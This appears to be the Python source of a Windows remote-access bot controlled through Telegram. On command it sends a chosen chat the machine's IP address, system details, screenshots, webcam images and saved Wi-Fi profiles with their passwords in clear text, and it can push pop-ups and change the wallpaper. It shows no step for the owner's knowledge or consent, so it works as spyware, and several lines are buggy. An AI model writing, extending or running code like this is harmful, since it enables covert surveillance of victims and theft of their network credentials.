from sys import stdout
import telebot
from telebot import types
import requests
import cv2
import ctypes
from ctypes import wintypes
import pyautogui as pag
import platform as pf
import os
import subprocess as sp
import psutil
import time
from ahk import AHK
from ahk.window import Window
ahk = AHK

TOKEN = "Bot token"
CHAT_ID = "your chat id"
client = telebot.TeleBot(TOKEN)

requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Online")

@client.message_handler(commands=["start", "help"])
def start(message):
	rmk = types.ReplyKeyboardMarkup(resize_keyboard=True)
	btns = ["/ip", "/spec", "/screenshot", "/webcam",
			"/message", "/input", "/wallpaper", "/battery_percent"]

	for btn in btns:
		rmk.add(types.KeyboardButton(btn))

	client.send_message(message.chat.id, "Выберите действие:", reply_markup=rmk)


@client.message_handler(commands=["ip", "ip_address"])
def ip_address(message):
	response = requests.get("http://jsonip.com/").json()
	client.send_message(message.chat.id, f"IP Address: {response['ip']}")

@client.message_handler(commands=["wifi_info"])
def wifi_info(message):
	wifi_name = message.text[10:]
	os.system(f"netsh wlan show profile {wifi_name} key=clear > info.txt")

	file = open("info.txt", "rb")

	client.send_document(message.chat.id, file)

	file.close()
	os.system("rm info.txt")

@client.message_handler(commands=["spec", "specifications"])
def spec(message):
	msg = f"Name PC: {pf.node()}\nProcessor: {pf.processor()}\nSystem: {pf.system()} {pf.release()}"
	client.send_message(message.chat.id, msg)


@client.message_handler(commands=["screenshot"])
def screenshot(message):
	pag.screenshot("000.jpg")

	with open("000.jpg", "rb") as img:
		client.send_photo(message.chat.id, img)
	
	os.system("rm 000.jpg")


@client.message_handler(commands=["webcam"])
def webcam(message):
	cap = cv2.VideoCapture(0)

	for i in range(30):
		cap.read()

	ret, frame = cap.read()

	cv2.imwrite("cam.jpg", frame)
	cap.release()

	with open("cam.jpg", "rb") as img:
		client.send_photo(message.chat.id, img)

	os.system("rm cam.jpg")


@client.message_handler(commands=["message"])
def message_sending(message):
	msg = client.send_message(message.chat.id, "Введите ваше сообщение, которое желаете вывести на экран.")
	client.register_next_step_handler(msg, next_message_sending)


def next_message_sending(message):
	try:
		pag.alert(message.text, "~")
	except Exception:
		client.send_message(message.chat.id, "Что-то пошло не так...")


@client.message_handler(commands=["input"])
def message_sending_with_input(message):
	msg = client.send_message(message.chat.id, "Введите ваше сообщение, которое желаете вывести на экран.")
	client.register_next_step_handler(msg, next_message_sending_with_input)


def next_message_sending_with_input(message):
	try:
		answer = pag.prompt(message.text, "~")
		client.send_message(message.chat.id, answer)
	except Exception:
		client.send_message(message.chat.id, "Что-то пошло не так...")


@client.message_handler(commands=["wallpaper"])
def wallpaper(message):
	msg = client.send_message(message.chat.id, "Отправьте картинку или ссылку")
	client.register_next_step_handler(msg, next_wallpaper)
	os.remove("rm image.jpg")


@client.message_handler(content_types=["photo"])
def next_wallpaper(message):
	file = message.photo[-1].file_id
	file = client.get_file(file)
	dfile = client.download_file(file.file_path)

	with open("image.jpg", "wb") as img:
		img.write(dfile)

	path = os.path.abspath("image.jpg")
	ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)

@client.message_handler(commands=["battery_percent"])
def send_bp(message):
	battery = psutil.sensors_battery()
	plugged = battery.power_plugged
	percent = str(battery.percent)
	plugged = "Заряжается" if plugged else "не заряжается"

	client.send_message(message.chat.id, "Заряд аккумуляторав равен " + percent+'%' + ' | ' +plugged)

client.polling()

os.system("pause")
